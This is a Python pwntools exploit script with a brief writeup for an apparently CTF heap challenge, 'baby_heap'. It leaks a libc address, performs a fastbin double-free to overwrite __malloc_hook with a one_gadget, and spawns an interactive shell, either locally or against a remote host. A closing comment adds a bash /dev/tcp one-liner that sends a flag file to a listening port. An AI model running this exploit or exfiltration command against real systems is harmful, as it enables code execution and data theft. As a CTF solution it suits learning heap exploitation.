from pwn import *
import sys
import time

context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# brva x = b *(pie+x)
# set follow-fork-mode
# p/x $fs_base
# vis_heap_chunks
if len(sys.argv) == 1:
    r = process("./baby_heap_patched")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)


def malloc(size, data):
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b":", str(size).encode())
    r.sendafter(b":", data)


def show(idx):
    r.sendlineafter(b">", b"2")
    r.sendlineafter(b":", str(idx).encode())


def free(idx):
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b":", str(idx).encode())


malloc(0x420, b"A")  # 0
malloc(0x70, b"A")  # 1
free(0)
show(0)
libc_leak = u64(r.recv(6).ljust(8, b"\x00"))
libc = libc_leak - 0x3C4B78
print(f"libc: {hex(libc)}")
malloc_hook = libc + 0x3C4B10
print(f"malloc_hook: {hex(malloc_hook)}")
malloc(0x60, b"B")  # 2
malloc(0x60, b"C")  # 3
free(2)
free(3)
free(2)
malloc(0x60, p64(malloc_hook - 0x13))  # 2
malloc(0x60, b"D")  # 3
malloc(0x60, b"E")  # 4
candidate = [283158, 283242, 839923, 840136, 983716, 983728, 987463, 1009392]
one_gadget = libc + candidate[4]
# one_gadget = 0xDEADBEEF
print(f"one_gadget: {hex(one_gadget)}")
malloc(0x60, b"\x00" * 0x3 + p64(one_gadget))  # 5
# r.sendlineafter(b'>',b'1')
# r.sendlineafter(b':',str(1).encode())
free(2)
# Double free to trigger __libc_message to print error message,
# it uses malloc and satisfies the condition of one_gadget[4], yeah!
free(2)
r.interactive()

"""
Writeup:
Cannot overwrite free hook since there's no valid 0x7f above it. (Size check)
I want to use unsorted bin attack to overwrite somewhere up free hook so it could pass size check. 
But I think we can't do it in this problem.
It use atoi in read_int function here so we cannot malloc the address of "/bin/sh" (which is a huge long long value) to trigger system("/bin/sh").
Double free to trigger __libc_message to print error message, 
And it uses malloc internally and satisfies the condition of one_gadget[4], yeah!
"""


"""
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
"""
